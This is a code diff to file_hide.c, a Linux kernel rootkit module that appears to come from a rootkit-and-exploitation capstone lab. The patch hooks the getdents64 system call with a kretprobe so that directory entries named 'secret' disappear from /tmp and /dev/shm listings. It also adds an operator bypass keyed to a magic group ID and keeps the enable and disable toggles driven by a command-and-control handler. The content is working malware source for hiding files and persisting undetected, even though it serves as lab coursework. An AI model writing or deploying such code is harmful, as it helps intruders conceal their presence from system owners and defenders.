@@ -1,14 +1,16 @@
 /*
- * file_hide.c — File hiding via getdents64 kretprobe
+ * file_hide.c: hide secret directories from directory listings
  *
- * Capstone: Kernel Rootkit + Exploitation
+ * When a process lists /tmp or /dev/shm, remove the entry named "secret"
+ * so it does not appear. Use d_path() to identify which directory is being
+ * listed: do NOT use d_iname(), it returns the device name for mount
+ * points, not the path you expect.
  *
- * Hooks __arm64_sys_getdents64 using a kretprobe. The entry handler saves the
- * userspace buffer pointer. The return handler copies the dirent buffer into
- * kernel space, removes entries matching HIDDEN_PREFIX, and copies the filtered
- * buffer back to userspace.
+ * Operator bypass: processes with MAGIC_GID see everything. Walk
+ * cred->group_info directly: do NOT use in_group_p() (returns true for
+ * root).
  *
- * Reference: modules/cloak/cloak.c in the QEMU lab
+ * Reference: cloak.c in the QEMU lab
  */
 
 #include <linux/module.h>
@@ -17,17 +19,21 @@
 #include <linux/uaccess.h>
 #include <linux/slab.h>
 #include <linux/dirent.h>
+#include <linux/fs.h>
+#include <linux/file.h>
+#include <linux/dcache.h>
+#include <linux/cred.h>
 #include <asm/ptrace.h>
 
 #include "rootkit.h"
 
-/* Maximum dirent buffer size we'll handle (64 KiB) */
 #define MAX_BUF_SIZE (1 << 16)
 
 /* ─── Per-instance data passed from entry to return handler ───────────────── */
 
 struct file_hide_data {
 	struct linux_dirent64 __user *dirp;
+  unsigned int fd;
 };
 
 /* ─── Entry handler ───────────────────────────────────────────────────────── */
@@ -37,8 +43,10 @@ static int file_hide_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 	struct pt_regs *inner_regs = (struct pt_regs *)regs->regs[0];
 	struct file_hide_data *data = (struct file_hide_data *)ri->data;
 
-	/* dirp is the second syscall arg → regs[1] of the inner pt_regs */
+	/* dirp is the second syscall arg -> regs[1] of the inner pt_regs */
+  /* and fd is the first arg -> regs[0] of the inner pt_regs*/
 	data->dirp = (struct linux_dirent64 __user *)inner_regs->regs[1];
+  data->fd = (unsigned int)inner_regs->regs[0];
 
 	return 0;
 }
@@ -49,18 +57,45 @@ static int file_hide_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
 	struct file_hide_data *data = (struct file_hide_data *)ri->data;
 	struct linux_dirent64 __user *dirp = data->dirp;
+  unsigned int fd = data->fd;
+  struct file *file;
 	struct linux_dirent64 *current_dir, *prev = NULL;
 	int total_bytes = regs_return_value(regs);
-	char *kbuf;
+	char buf[MAX_PATH_LEN];
+  char *kbuf, *path_str;
 	int offset = 0;
 
+  /* converting fd to a struct file * */
+  file = fget(fd);
+  if (!file)
+    return 0;
+
+  /* getting absolute filename from d_path() */
+  path_str = d_path(&file->f_path, buf, sizeof(buf));
+  if (IS_ERR(path_str)) {
+    fput(file);
+    return 0;
+  }
+
 	/* Nothing to filter if getdents64 returned 0 or error */
-	if (total_bytes <= 0)
-		return 0;
+	if (total_bytes <= 0) {
+		fput(file);
+    return 0;
+  }
 
 	/* Privileged user sees everything */
-	if (guardian_has_magic_gid())
-		return 0;
+	if (caller_has_magic_gid()) {
+		fput(file);
+    return 0;
+  }
+
+  /* Non hidden files do not get filtered*/
+  if (strncmp(path_str, "/dev/shm", 9) != 0 && strncmp(path_str, "/tmp", 5) != 0) {
+    fput(file);
+    return 0;
+  }
+
+  fput(file);
 
 	/* Atomic because kretprobe handlers run in atomic context */
 	kbuf = kmalloc(total_bytes, GFP_ATOMIC);
@@ -76,7 +111,7 @@ static int file_hide_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 	while (offset < total_bytes) {
 		current_dir = (struct linux_dirent64 *)(kbuf + offset);
 
-		if (strncmp(current_dir->d_name, HIDDEN_PREFIX, HIDDEN_PREFIX_LEN) != 0) {
+		if (strncmp(current_dir->d_name, HIDDEN_FILENAME, HIDDEN_FILENAME_LEN) != 0) {
 			/* No match — advance */
 			prev = current_dir;
 			offset += current_dir->d_reclen;
@@ -126,7 +161,7 @@ int file_hide_init(void)
 {
   int ret = register_kretprobe(&file_hide_krp);
   if (ret < 0){
-    pr_err("[file_hide] [error] failed to register kretprobe: %d\n", ret);
+    pr_err("[file_hide][ERROR] failed to register kretprobe: %d\n", ret);
     return ret;
   }
 
@@ -138,18 +173,17 @@ int file_hide_init(void)
 void file_hide_exit(void)
 {
   if (!file_hide_is_active()) {
-    pr_err("[file_hide] [error] Could not unregister kretprobe (no kretprobe active)\n");
+    pr_err("[file_hide][ERROR] Could not unregister kretprobe (no kretprobe active)\n");
     return;
   }
   
   unregister_kretprobe(&file_hide_krp);
+  pr_info("[file_hide] kretprobe unregistered");
   pr_info("[file_hide] nmissed counter:%d\n", file_hide_krp.nmissed);
   active = false;
 }
 
-/*
- * These are called by the C2 handler for toggle commands.
- */
+//called by the C2 handler for toggle commands.
 int file_hide_enable(void)
 {
 	return file_hide_init();
